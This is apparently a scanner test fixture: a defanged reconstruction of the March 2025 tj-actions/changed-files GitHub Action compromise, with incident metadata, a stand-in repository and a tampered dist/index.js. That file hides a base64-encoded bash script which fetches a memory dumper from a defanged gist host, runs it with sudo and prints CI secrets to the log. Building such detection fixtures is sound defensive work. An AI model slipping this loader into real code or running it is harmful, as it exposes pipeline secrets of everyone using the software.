@@ -1,0 +1,419 @@
+# Defanged reconstruction of a real malicious change, for scanner tests.
+# Never run. See internal/e2e/livescan/corpus.go.
+id: tj-actions-changed-files
+title: "tj-actions/changed-files (GitHub Action): bot-spoofed commit makes dist/index.js fetch and run a runner-memory dumper"
+campaign: github-actions-2025-03
+date: "2025-03-14"
+kind: git-commit
+ecosystem: git
+name: tj-actions/changed-files
+version: "0e58ed8"
+benignVersion: "v45.0.7"
+summary: >-
+  On 2025-03-14 an attacker holding the Personal Access Token of the
+  @tj-actions-bot account put commit 0e58ed8 into tj-actions/changed-files, a
+  GitHub Action used by more than 23,000 repositories, and at 16:57 UTC moved
+  almost every version tag (v1.0.0 up to v45.0.7) to it, so workflows that
+  referenced a tag such as @v35 ran it. The commit was authored as
+  renovate[bot] with the title "chore(deps): lock file maintenance (#2460)"
+  and carried no signature (the real bot was not compromised). It changed only
+  the bundled dist/index.js (which the repository marks -diff, so git show
+  prints "Binary files differ" for it), adding a function updateFeatures(token)
+  that runs bash through @actions/exec on a base64 string decoded into
+  /tmp/run.sh. On Linux runners that script fetched memdump.py from a GitHub
+  gist and ran it with sudo python3; memdump.py found the Runner.Worker
+  process and read its memory through /proc/<pid>/maps and /proc/<pid>/mem,
+  and the shell kept the {"value":...,"isSecret":true} entries and printed them,
+  base64-encoded twice, into the workflow log, where the log of a public
+  repository showed them to anyone. StepSecurity saw no exfiltration to a
+  server of the attacker's. Wiz and Unit 42 trace the token theft to the
+  compromise of reviewdog/action-setup@v1 on 2025-03-11 (CVE-2025-30154),
+  which the maintainers' tj-actions/eslint-changed-files workflow ran with that
+  token; the maintainers said GitHub could not determine how it leaked. Reports
+  differ on how the commit got in (an orphan commit the tags were moved to, or
+  a push to a Renovate pull request branch that auto-merged) and on when the
+  first malicious commit was made (March 12 per Sysdig and Orca, between March
+  10 and 14 per Unit 42). StepSecurity's Harden-Runner flagged the unexpected
+  request to gist.githubusercontent.com, issue #2463 was opened the same day,
+  and GitHub took the repository down on March 15 and restored it without the
+  commit. The attack is tracked as CVE-2025-30066 and fixed in 46.0.1.
+techniques: [stolen-token, imposter-commit, bot-identity-spoofing, tag-repointing, dist-bundle-injection, download-and-execute, runner-memory-scrape, secrets-in-logs]
+reconstruction: >-
+  dist/index.js is a small ncc-style bundle (module table, __nccwpck_require__)
+  around a stand-in run(); the real file is over 2 MB. As in the real commit,
+  only that file changes. The commit adds async function updateFeatures(token),
+  which calls exec.getExecOutput('bash', ['-c', ...], {ignoreReturnCode: true,
+  silent: true}) on "echo <base64> | base64 -d > /tmp/run.sh && bash
+  /tmp/run.sh" and writes the output to the log with core.info (after Snyk's
+  reconstruction and the Aqua and Oasis descriptions), and calls it from run();
+  the real commit has since been deleted and the text sources do not say where
+  its call sat, so here it follows the inputs. The base64 decodes to the script
+  StepSecurity printed: the Linux guard, curl of memdump.py piped to sudo
+  python3, tr -d '\0', grep -aoE for the isSecret entries, sort -u, base64 -w 0
+  twice, echo $B64_BLOB, else exit 0. The gist host is defanged
+  (gist.githubusercontent.com.invalid) and the gist path is a placeholder;
+  memdump.py, the memory scrape itself, was never part of the commit and is not
+  reproduced. The suite fixes the commit times, and the rest of the repository
+  (action.yml, src/, package.json, README) is a small stand-in. The
+  repository's .gitattributes line (dist/** -diff) is kept: it made git show
+  print "Binary files differ" for the real commit, so a scanner that reads
+  diffs with the repository's attributes honoured sees no content at all. The
+  commit scan now reads diffs with attributes switched off (internal/scan/watch,
+  attr.tree), and this sample is its regression test. The control is an invented
+  dependency bump under the same bot identity.
+references:
+  - https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
+  - https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
+  - https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
+  - https://github.com/tj-actions/changed-files/issues/2463
+  - https://github.com/tj-actions/changed-files/issues/2464
+  - https://snyk.io/blog/reconstructing-tj-actions-changed-files-github-actions-compromise
+  - https://www.aquasec.com/blog/github-action-tj-actions-changed-files-compromised/
+  - https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
+  - https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/
+  - https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
+indicators:
+  - updateFeatures
+  - /tmp/run.sh
+commit:
+  repository: tj-actions/changed-files
+  author: '"renovate[bot]" <"29139614+renovate[bot]"@users.noreply.github.com>'
+  maliciousAuthor: '"renovate[bot]" <"29139614+renovate[bot]"@users.noreply.github.com>'
+  baseMessage: "chore(deps): update dependency @vercel/ncc to v0.38.3 (#2455)"
+  benignMessage: "chore(deps): update dependency @types/node to v22.13.10 (#2459)"
+  maliciousMessage: "chore(deps): lock file maintenance (#2460)"
+-- shared/.gitattributes --
+dist/** -diff
+-- shared/action.yml --
+name: 'Changed Files'
+description: 'Get all Added, Copied, Modified, Deleted, Renamed, Type changed, Unmerged, and Unknown files.'
+author: 'tj-actions'
+
+inputs:
+  token:
+    description: 'GitHub token used to call the REST API when there is no local clone.'
+    required: false
+    default: ${{ github.token }}
+  base_sha:
+    description: 'Commit SHA to compare against (defaults to the parent of the head commit).'
+    required: false
+  sha:
+    description: 'Commit SHA of the head of the comparison.'
+    required: false
+    default: ${{ github.sha }}
+
+outputs:
+  all_changed_files:
+    description: 'All added, copied, modified and renamed files, separated by a space.'
+  any_changed:
+    description: 'true when at least one file changed.'
+
+runs:
+  using: 'node20'
+  main: 'dist/index.js'
+-- shared/README.md --
+# changed-files
+
+Retrieve all the files that changed in a pull request or a push.
+
+## Usage
+
+```yaml
+- uses: tj-actions/changed-files@v45
+  id: changed-files
+
+- name: List all changed files
+  run: |
+    for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
+      echo "$file was changed"
+    done
+```
+
+## Inputs and outputs
+
+See [action.yml](action.yml). Releases are listed on the
+[releases page](https://github.com/tj-actions/changed-files/releases).
+-- shared/package.json --
+{
+  "name": "changed-files",
+  "version": "45.0.7",
+  "description": "Retrieve all the files that changed in a pull request or a push.",
+  "main": "lib/main.js",
+  "scripts": {
+    "build": "tsc",
+    "package": "ncc build lib/main.js --source-map --license licenses.txt"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/tj-actions/changed-files.git"
+  },
+  "license": "MIT",
+  "dependencies": {
+    "@actions/core": "^1.11.1",
+    "@actions/exec": "^1.1.1"
+  },
+  "devDependencies": {
+    "@types/node": "^22.13.9",
+    "@vercel/ncc": "^0.38.3",
+    "typescript": "^5.8.2"
+  }
+}
+-- shared/src/main.ts --
+import * as core from '@actions/core'
+import * as exec from '@actions/exec'
+import {getInputs} from './inputs'
+
+async function getChangedFiles(base: string, head: string): Promise<string[]> {
+  const {stdout} = await exec.getExecOutput('git', ['diff', '--name-only', `${base}...${head}`], {silent: true})
+  return stdout.split('\n').filter(Boolean)
+}
+
+export async function run(): Promise<void> {
+  core.startGroup('changed-files')
+  const inputs = getInputs()
+  const files = await getChangedFiles(inputs.baseSha, inputs.sha)
+  core.setOutput('all_changed_files', files.join(' '))
+  core.setOutput('any_changed', String(files.length > 0))
+  core.endGroup()
+}
+
+run().catch(err => core.setFailed(err.message))
+-- shared/src/inputs.ts --
+import * as core from '@actions/core'
+
+export interface Inputs {
+  token: string
+  baseSha: string
+  sha: string
+}
+
+export function getInputs(): Inputs {
+  return {
+    token: core.getInput('token'),
+    baseSha: core.getInput('base_sha') || 'HEAD^',
+    sha: core.getInput('sha') || 'HEAD'
+  }
+}
+-- shared/dist/index.js --
+require('./sourcemap-register.js');/******/ (() => { // webpackBootstrap
+/******/ 	var __webpack_modules__ = ({
+
+/***/ 5915:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.run = void 0;
+const core = __nccwpck_require__(2186);
+const exec = __nccwpck_require__(1514);
+const inputs_1 = __nccwpck_require__(6013);
+async function getChangedFiles(base, head) {
+    const { stdout } = await exec.getExecOutput('git', ['diff', '--name-only', `${base}...${head}`], { silent: true });
+    return stdout.split('\n').filter(Boolean);
+}
+async function run() {
+    core.startGroup('changed-files');
+    const inputs = (0, inputs_1.getInputs)();
+    const files = await getChangedFiles(inputs.baseSha, inputs.sha);
+    core.setOutput('all_changed_files', files.join(' '));
+    core.setOutput('any_changed', String(files.length > 0));
+    core.endGroup();
+}
+exports.run = run;
+run().catch(err => core.setFailed(err.message));
+
+
+/***/ }),
+
+/***/ 6013:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.getInputs = void 0;
+const core = __nccwpck_require__(2186);
+function getInputs() {
+    return {
+        token: core.getInput('token'),
+        baseSha: core.getInput('base_sha') || 'HEAD^',
+        sha: core.getInput('sha') || 'HEAD'
+    };
+}
+exports.getInputs = getInputs;
+
+
+/***/ })
+
+/******/ });
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/
+/******/ 	// The require function
+/******/ 	function __nccwpck_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/
+/******/ 		// Execute the module function
+/******/ 		var threw = true;
+/******/ 		try {
+/******/ 			__webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);
+/******/ 			threw = false;
+/******/ 		} finally {
+/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
+/******/ 		}
+/******/
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/
+/************************************************************************/
+/******/
+/******/ 	// startup
+/******/ 	// Load entry module and return exports
+/******/ 	// This entry module is referenced by other modules so it can't be inlined
+/******/ 	var __webpack_exports__ = __nccwpck_require__(5915);
+/******/ 	module.exports = __webpack_exports__;
+/******/
+/******/ })()
+;
+//# sourceMappingURL=index.js.map
+-- benign/package.json --
+{
+  "name": "changed-files",
+  "version": "45.0.7",
+  "description": "Retrieve all the files that changed in a pull request or a push.",
+  "main": "lib/main.js",
+  "scripts": {
+    "build": "tsc",
+    "package": "ncc build lib/main.js --source-map --license licenses.txt"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/tj-actions/changed-files.git"
+  },
+  "license": "MIT",
+  "dependencies": {
+    "@actions/core": "^1.11.1",
+    "@actions/exec": "^1.1.1"
+  },
+  "devDependencies": {
+    "@types/node": "^22.13.10",
+    "@vercel/ncc": "^0.38.3",
+    "typescript": "^5.8.2"
+  }
+}
+-- malicious/dist/index.js --
+require('./sourcemap-register.js');/******/ (() => { // webpackBootstrap
+/******/ 	var __webpack_modules__ = ({
+
+/***/ 5915:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.run = void 0;
+const core = __nccwpck_require__(2186);
+const exec = __nccwpck_require__(1514);
+const inputs_1 = __nccwpck_require__(6013);
+async function getChangedFiles(base, head) {
+    const { stdout } = await exec.getExecOutput('git', ['diff', '--name-only', `${base}...${head}`], { silent: true });
+    return stdout.split('\n').filter(Boolean);
+}
+async function updateFeatures(token) {
+    const result = await exec.getExecOutput('bash', ['-c', "echo 'aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tLmludmFsaWQvZXhhbXBsZS8wMTIzNDU2Nzg5YWJjZGVmMDEyMzQ1Njc4OWFiY2RlZi9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=' | base64 -d > /tmp/run.sh && bash /tmp/run.sh"], {
+        ignoreReturnCode: true,
+        silent: true
+    });
+    core.info(result.stdout);
+}
+async function run() {
+    core.startGroup('changed-files');
+    const inputs = (0, inputs_1.getInputs)();
+    await updateFeatures(inputs.token);
+    const files = await getChangedFiles(inputs.baseSha, inputs.sha);
+    core.setOutput('all_changed_files', files.join(' '));
+    core.setOutput('any_changed', String(files.length > 0));
+    core.endGroup();
+}
+exports.run = run;
+run().catch(err => core.setFailed(err.message));
+
+
+/***/ }),
+
+/***/ 6013:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.getInputs = void 0;
+const core = __nccwpck_require__(2186);
+function getInputs() {
+    return {
+        token: core.getInput('token'),
+        baseSha: core.getInput('base_sha') || 'HEAD^',
+        sha: core.getInput('sha') || 'HEAD'
+    };
+}
+exports.getInputs = getInputs;
+
+
+/***/ })
+
+/******/ });
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/
+/******/ 	// The require function
+/******/ 	function __nccwpck_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/
+/******/ 		// Execute the module function
+/******/ 		var threw = true;
+/******/ 		try {
+/******/ 			__webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);
+/******/ 			threw = false;
+/******/ 		} finally {
+/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
+/******/ 		}
+/******/
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/
+/************************************************************************/
+/******/
+/******/ 	// startup
+/******/ 	// Load entry module and return exports
+/******/ 	// This entry module is referenced by other modules so it can't be inlined
+/******/ 	var __webpack_exports__ = __nccwpck_require__(5915);
+/******/ 	module.exports = __webpack_exports__;
+/******/
+/******/ })()
+;
+//# sourceMappingURL=index.js.map
